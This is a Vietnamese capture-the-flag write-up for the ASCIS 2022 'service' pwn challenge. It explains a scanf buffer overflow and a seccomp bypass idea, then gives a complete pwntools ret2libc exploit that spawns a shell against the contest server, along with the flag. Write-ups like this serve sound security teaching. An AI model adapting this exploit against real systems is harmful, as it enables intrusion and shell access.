# service

Đây là một bài cực kì dễ trong kì thi lần này, dễ hơn cả đề của vòng khởi động =))), không biết là do chủ đích của tác giả hay do một lí do nào đó khiến cho đề thọt (cá nhân mình nghĩ là lí do này).

Bài này chỉ là một bài buffer overflow cơ bản với `scanf("%s")` trên một binary không PIE và không canary => simple ROP attack.

## Checksec

![image](https://user-images.githubusercontent.com/57558487/196594037-1675bdee-be27-4df7-acbb-c3e908634ab9.png)

## Reverse

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int result; // eax
  char v4[32]; // [rsp+10h] [rbp-30h] BYREF
  int v5; // [rsp+30h] [rbp-10h] BYREF
  unsigned int buf; // [rsp+34h] [rbp-Ch] BYREF
  int fd; // [rsp+38h] [rbp-8h]
  int v8; // [rsp+3Ch] [rbp-4h]

  buf = 0;
  v8 = 0;
  v5 = 0;
  setupbuf(argc, argv, envp);
  fd = open("/dev/urandom", 0);
  if ( fd == -1 )
  {
    puts("Opening /dev/urandom failed, contact admin.");
    result = 0;
  }
  else
  {
    if ( check )
      setup_seccomp();
    read(fd, &buf, 4uLL);
    srand(buf);
    v8 = rand();
    puts("*-*-*-*-*-* Welcome to ASCIS 2022 *-*-*-*-*-*-*\n");
    printf("What is your name?\n\n> ");
    __isoc99_scanf("%s", v4);
    printf("Can you guess my secret?\n\n> ");
    __isoc99_scanf("%d", &v5);
    if ( v8 != v5 )
      exit(0);
    win();
    result = 0;
  }
  return result;
}
```

Nhìn qua đề, ta có thể thấy ban đầu đề gọi `open("/dev/urandom", 0)`, sau đó 4 byte random vào `buf`, sau đó yêu cầu ta đoán nó, tuy nhiên vì hàm `__isoc99_scanf("%s", v4)` có lỗi buffer overflow, ta chỉ cần đơn giản đè qua biến `buf` và sau đó nhập giá trị `v5` với giá trị ta vừa đè là bypass được hàm `exit(0)`

Tiếp theo đó vì binary không bật cả PIE lẫn canary, ta có thể dễ dàng đè qua return address và tiến hành ROP attack. đầu ta dùng `puts(puts.got)` để in ra địa chỉ của libc, sau đó gọi trở lại hàm `main`, tiến hành tấn công một lần nữa đề gọi `system("/bin/sh")`

Quá dễ phải không, tuy nhiên đó là do mình chưa đề cập đến hàm `setup_seccomp()` ở phía trên, hàm này được dùng để quy định các `syscall` được gọi hay không. Tuy nhiên hàm này chỉ dược kích hoạt khi giá trị biến `check` khác 0.

Trong binary mà ban tổ chức đưa cho mình, giá trị `check` = 0, mình kiểm tra các giá trị tham chiếu đến biến `check` cũng không có gì đặc biệt. Vì thế trên local hàm `setup_seccomp()` không được gọi, và ở server cũng vậy :)))

![image](https://user-images.githubusercontent.com/57558487/196594922-fef96481-a502-4615-b46c-52a61d39e2b8.png)

Mình nghĩ đây là lỗi kĩ thuật, vì khi mình xem qua filter syscall trong hàm, mình nhận ra ý đồ khá rõ ràng của tác giả, bạn có thể xem seccomp dump phía dưới

![image](https://user-images.githubusercontent.com/57558487/196595147-6dea33e1-563b-4485-90fa-8cba3a8c5d52.png)

Tác giả chỉ allow một số syscall nhất định, trong đó không có `execve` và `open`, khiến cho ta không thể chạy shell hoặc gọi chain `open` -> `read` -> `write`, tuy nhiên filter ở đây bị thọt là không check arch, ta có thể switch sang x86 để bypass các filter, lúc này syscall `fstat` ở x86_64 sẽ trở thành syscall `open` ở x86 :))

![image](https://user-images.githubusercontent.com/57558487/196595679-04e47577-e67b-4e5d-ac5f-9072fbd47da5.png)

Tác giả cũng đã cung cấp đường dẫn file `flag` trong hàm `win`, nên mình khác chắc đây là một bài bypass seccomp và gọi `open` -> `read` -> `write`, tuy nhiên vì đề thọt trong khi thi nên nó trở thành một bài newbiew :))).

Trong cuộc thi thì mình làm theo cách cơ bản, nhưng nếu bài không bị lỗi thì mình nghĩ cũng sẽ không quá khó, sau khi leak được libc address, ta có thể build một ROPchain đầy đủ. Có thể dùng `retf` và `int0x80` để gọi các syscall ở x86.

Đây là exploit code mình dùng để giải.

```python
#
#	***************************
#	* Pwning exploit template *
#	* Arthor: Cobra           *
#	***************************
#

from pwn import *
import sys

local = 0
debug = 0

# context.arch = 'amd64'
# context.aslr = False
# context.log_level = 'debug'
# context.terminal = ['tmux', 'splitw', '-h', '-F' '#{pane_pid}', '-P']
# context.timeout = 2

def conn():
	global local
	global debug

	for arg in sys.argv[1:]:
		if arg in ('-h', '--help'):
			print('Usage: python ' + sys.argv[0] + ' <option> ...')
			print('Option:')
			print('        -h, --help:     Show help')
			print('        -l, --local:    Running on local')
			print('        -d, --debug:    Use gdb auto attach')
			exit(0)
		if arg in ('-l', '--local'):
			local = 1
		if arg in ('-d', '--debug'):
			debug = 1

	if local:
		s = process('./chall_patched')
		if debug:
			gdb.attach(s, gdbscript='''
				b*0x00000000004014bb
			''' + 'c\n' * 1)
		else:
			raw_input('DEBUG')
	else:
		s = remote('34.143.130.87', 4097)

	return s

s = conn()

elf = ELF('chall')
libc = ELF('libc-2.31.so')

rop = ROP(elf)

pop_rdi = rop.find_gadget(['pop rdi', 'ret']).address
ret = rop.find_gadget(['ret']).address

payload = p64(0) * 6
payload += p64(0) + p64(ret)
payload += p64(pop_rdi) + p64(elf.got['puts'])
payload += p64(elf.symbols['puts']) + p64(ret)
payload += p64(elf.symbols['main'])

s.sendlineafter(b'> ', payload)
s.sendlineafter(b'> ', b'0')

s.recvuntil(b'cat /home/ctf/flag.txt\n')

libc.address = int.from_bytes(s.recv(6), byteorder = 'little', signed = False) - libc.symbols['puts']
log.info('Libc base: 0x%x', libc.address)

payload = p64(0) * 6
payload += p64(0) + p64(ret)
payload += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh')))
payload += p64(libc.symbols['system'])

s.sendlineafter(b'> ', payload)
s.sendlineafter(b'> ', b'0')

s.sendline(b'cat /home/ctf/flag.txt')

s.interactive()
```

Flag: ASCIS{syscall_g00d_int_0x80_b3st}

